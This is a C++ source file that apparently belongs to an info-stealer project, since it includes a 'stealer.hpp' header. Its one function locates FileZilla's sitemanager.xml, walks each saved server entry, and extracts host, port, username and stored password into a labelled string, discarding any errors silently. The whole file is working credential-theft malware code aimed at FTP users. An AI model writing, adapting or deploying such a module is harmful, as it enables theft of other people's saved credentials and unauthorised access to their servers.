#include "../stealer.hpp"

string GetFileZillaPasswords( API* api, string sitemanager ) {
	string ret = "";
	sitemanager += "FileZilla\\sitemanager.xml";
	try {
		string serversfile = GetFileData(api, sitemanager);
		string currserver = "", currline = "";
		int end = 0, temppos = 0;
		while (serversfile.find("<Server>") != string::npos) {
			end = serversfile.find("</Server>");
			currserver = serversfile.substr(serversfile.find("<Server>") + lstrlen("<Server>") + 2, serversfile.find("</Server>") + api->lstrlen("</Server>") + 1);
			currline = currserver.substr(0, currserver.find('\n') + 1);
			while (currline.find("</Server>") == string::npos && currline != "") {
				currline = currserver.substr(0, currserver.find('\n') + 1);
				if (currline.find("<Host>") != string::npos) {
					ret += "FZ: ";
					temppos = currline.find("<Host>");
					temppos = currline.find("</Host>", temppos + api->lstrlen("<Host>") + 1) - temppos - api->lstrlen("<Host>");
					ret += currline.substr(currline.find("<Host>") + api->lstrlen("<Host>"), temppos);
					ret += ":";
				} else if (currline.find("<Port>") != string::npos) {
					temppos = currline.find("<Port>");
					temppos = currline.find("</Port>", temppos + api->lstrlen("<Port>") + 1) - temppos - api->lstrlen("<Port>");
					ret += currline.substr(currline.find("<Port>") + api->lstrlen("<Port>"), temppos);
					ret += " | ";				
				} else if (currline.find("<User>") != string::npos) {
					temppos = currline.find("<User>");
					temppos = currline.find("</User>", temppos + api->lstrlen("<User>") + 1) - temppos - api->lstrlen("<User>");
					ret += currline.substr(currline.find("<User>") + api->lstrlen("<User>"), temppos);
					ret += ":";
				} else if (currline.find("<Pass>") != string::npos) {
					temppos = currline.find("<Pass>");
					temppos = currline.find("</Pass>", temppos + api->lstrlen("<Pass>") + 1) - temppos - api->lstrlen("<Pass>");
					ret += currline.substr(currline.find("<Pass>") + api->lstrlen("<Pass>"), temppos);
				}
				currserver = currserver.substr(currserver.find('\n') + 1, currserver.length() - currserver.find('\n') + 1);
			}
			ret += "\n";
			serversfile.erase(0, serversfile.find("</Server>") + api->lstrlen("</Server>"));
		}
	} catch (...) {}
	return ret;
}